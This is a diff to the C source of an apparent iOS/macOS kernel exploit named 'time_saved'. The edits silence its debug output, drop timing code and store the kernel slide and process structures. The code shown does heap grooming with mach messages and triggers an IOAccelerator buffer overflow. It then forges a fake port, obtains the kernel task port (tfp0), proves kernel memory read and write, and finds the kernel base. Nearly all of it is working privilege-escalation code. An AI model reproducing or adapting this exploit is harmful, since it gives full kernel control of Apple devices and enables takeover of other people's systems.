@@ -7,7 +7,7 @@
 #include <mach/mach_time.h>
 #include "time_saved.h"
 
-#define try(cond,fail,success) if(cond){printf("[-] %s\n",fail);goto err;}if(strlen(success)!=0)printf("[*] %s\n",success);
+#define try(cond,fail,success) if(cond){/*printf("[-] %s\n",fail);*/goto err;}if(strlen(success)!=0){/*printf("[*] %s\n",success)*/};
 #define simple_sz sizeof(struct simple_msg)
 
 #define MB * 1024 * 1024
@@ -17,8 +17,11 @@
 #define POP_PORT() ports[port_i++]
 
 uint64_t kernel_base = 0;
+uint64_t kernel_slide = 0;
 uint64_t self_struct_task = 0;
+uint64_t self_struct_proc = 0;
 uint64_t kern_struct_task = 0;
+uint64_t kern_struct_proc = 0;
 uint64_t our_task_addr = 0;
 
 static inline uint32_t mach_port_waitq_flags() {
@@ -62,10 +65,6 @@ uint64_t find_port_via_cuck00(mach_port_t port) {
 }
 
 int start_time_saved(void) {
-    clock_t start, end;
-    double cpu_time_used;
-    start = clock();  // Record the starting time
-
     void *data = NULL;
     mach_port_t ports[port_cnt] = {};
     mach_port_t new_tfp0 = MACH_PORT_NULL;
@@ -83,7 +82,7 @@ int start_time_saved(void) {
     for (int i = 0; i < port_cnt; i++) ports[i] = new_mach_port();
     int port_i = 0;
     
-    printf("[*] Doing stage 0 heap setup\n");
+    // printf("[*] Doing stage 0 heap setup\n");
     mach_port_t saved_ports[10];
     mach_msg_size_t msg_size = msg_sz_kalloc(7 * ps) - simple_sz;
     data = calloc(1, msg_size);
@@ -113,7 +112,7 @@ int start_time_saved(void) {
             "Failed to send message", "");
     }
    
-    printf("[*] Doing stage 1 heap setup\n");
+    // printf("[*] Doing stage 1 heap setup\n");
     int property_index = 0;
     uint32_t huge_kalloc_key = transpose(property_index++);
     struct IOAccelDeviceShmemData cmdbuf, seglist;
@@ -169,17 +168,17 @@ retry:;
     
     uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow)));
     if (ipc_kmsg_size < (min + 1) || ipc_kmsg_size > 0x0400a8ff) {
-        printf("[-] trying to get a new timestamp...\n");
+        // printf("[-] trying to get a new timestamp...\n");
         usleep(100);
         goto retry;
     }
     
-    printf("[*] Triggering bug with %d bytes\n", overflow);
+    // printf("[*] Triggering bug with %d bytes\n", overflow);
     overflow_n_bytes(96 MB, overflow, &cmdbuf, &seglist);
-    printf("[*] Corruption worked?\n");
+    // printf("[*] Corruption worked?\n");
 
     mach_port_destroy(mach_task_self(), corrupt_port);
-    printf("[*] Freed kmsg\n");
+    // printf("[*] Freed kmsg\n");
     mach_port_t msg_leak = POP_PORT();
     
     for (int i = 0; i < is_4k(720, 1024); i++)
@@ -217,8 +216,8 @@ retry:;
     uint64_t ikm_header = *(uint64_t*)(ipc_kmsg + 24);
     uint64_t segment_list_addr = ikm_header - 96 MB - 96 MB - 8 * ps - 2 * ps - 0x28;
     
-    printf("[+] ikm_header leak: 0x%llx\n", ikm_header);
-    printf("[+] Segment list calculated to be at: 0x%llx\n", segment_list_addr);
+    // printf("[+] ikm_header leak: 0x%llx\n", ikm_header);
+    // printf("[+] Segment list calculated to be at: 0x%llx\n", segment_list_addr);
     
     uint64_t fake_port_page_addr = segment_list_addr + 96 MB;
     uint64_t fake_port_addr = fake_port_page_addr + 0x100;
@@ -272,13 +271,10 @@ retry:;
     
     try(!fakeport,
         "failed to get fakeport", "");
-    printf("[+] fakeport: 0x%x\n", fakeport);
     
     uint64_t leaked_port_addr = find_port_via_cuck00(ool_message_port);
     try(!leaked_port_addr,
         "Failed to leak port address", "");
-    
-    printf("[+] Leaked port: 0x%llx\n", leaked_port_addr);
 
     uint64_t *read_addr_ptr = (uint64_t *)((uint64_t)fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
     uint64_t ipc_space = kr64(leaked_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
@@ -296,9 +292,11 @@ retry:;
         uint64_t bsd_info = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
         if (kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID)) == 0) {
             kernel_vm_map = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));
+            kern_struct_proc = bsd_info;
             kern_struct_task = struct_task;
             break;
         } else if (kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID)) == getpid()) {
+            self_struct_proc = bsd_info;
             self_struct_task = struct_task;
         }
         struct_task = kr64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
@@ -312,7 +310,7 @@ retry:;
     try(!addr,
         "tfp0 port seems to not be working", "");
     
-    printf("[*] allocated: 0x%llx\n", addr);
+    // printf("[*] allocated: 0x%llx\n", addr);
     wk64(addr, 0x4141414141414141);
     
     uint64_t readb = rk64(addr);
@@ -320,7 +318,7 @@ retry:;
     try(readb != 0x4141414141414141,
         "read back value didn't match", "");
     
-    printf("[*] read back: 0x%llx\n", readb);
+    // printf("[*] read back: 0x%llx\n", readb);
     
     new_tfp0 = POP_PORT();
     try(!new_tfp0,
@@ -343,8 +341,8 @@ retry:;
     try(!addr,
         "tfp0 port seems to not be working", "");
     
-    printf("[+] tfp0: 0x%x\n", new_tfp0);
-    printf("[*] Allocated: 0x%llx\n", addr);
+    // printf("[+] tfp0: 0x%x\n", new_tfp0);
+    // printf("[*] Allocated: 0x%llx\n", addr);
     
     wk64(addr, 0x4141414141414141);
     readb = rk64(addr);
@@ -353,7 +351,7 @@ retry:;
     try(readb != 0x4141414141414141,
         "Read back value didn't match", "");
     
-    printf("[*] Read back: 0x%llx\n", readb);
+    // printf("[*] Read back: 0x%llx\n", readb);
 
     uint64_t IOSurface_port_addr = find_port(IOSurfaceRootUserClient);
     uint64_t IOSurface_object = rk64(IOSurface_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
@@ -365,12 +363,14 @@ retry:;
    
     while (true) {
         if (rk64(page) == 0x0100000cfeedfacf && (rk64(page + 8) == 0x0000000200000000 || rk64(page + 8) == 0x0000000200000002)) {
-            kernel_base = page; break;
+            kernel_base = page; 
+            kernel_slide = kernel_base - 0xfffffff007004000;
+            break;
         }
         page -= ps;
     }
 
-    printf("[-] cleaning up...\n");
+    // printf("[-] cleaning up...\n");
     our_task_addr = rk64(our_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
     uint64_t itk_space = rk64(our_task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
     uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
@@ -391,7 +391,7 @@ retry:;
         uint64_t object = OSArray_objectAtIndex(spray_array, i); // OSData *
         uint64_t buffer = OSData_buffer(object);
         if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * ps) {
-            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
+            // printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
             OSData_setLength(object, 0); // null out the size, this buffer was freed & reallocated
             break;
         }
@@ -404,7 +404,7 @@ retry:;
         uint64_t object = OSArray_objectAtIndex(ool_array, i); // OSData *
         uint64_t buffer = OSData_buffer(object);
         if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * ps + 8 * ps) {
-            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
+            // printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
             OSData_setLength(object, 0);
             break;
         }
@@ -425,11 +425,11 @@ retry:;
                 if (mach_vm_allocate(new_tfp0, &page, ps, VM_FLAGS_FIXED)) {
                     uint64_t readval = rk64(page);
                     if (readval == 0x4242424242424242) {
-                        printf("[*] fixing corrupted OSData buffer at 0x%llx\n", buffer);
+                        // printf("[*] fixing corrupted OSData buffer at 0x%llx\n", buffer);
                         OSData_setBuffer(object, page);
                         OSData_setLength(object, 8 * ps - (uint32_t)(page - buffer));
                         goto out;
-                    } else printf("[*] part of buffer reallocated by the system, keeping\n");
+                    } /* else printf("[*] part of buffer reallocated by the system, keeping\n"); */
                 } else kfree(page, ps);
             }
             OSData_setLength(object, 0);
@@ -446,8 +446,6 @@ err:;
     
     term_IOAccelerator();
     term_IOSurface();
-    
-    end = clock();cpu_time_used = ((double) (end - start)) / CLOCKS_PER_SEC;
-    printf("tfp0 in: %.2f milliseconds\n", cpu_time_used * 1000.0f);
+
     return new_tfp0;
 }
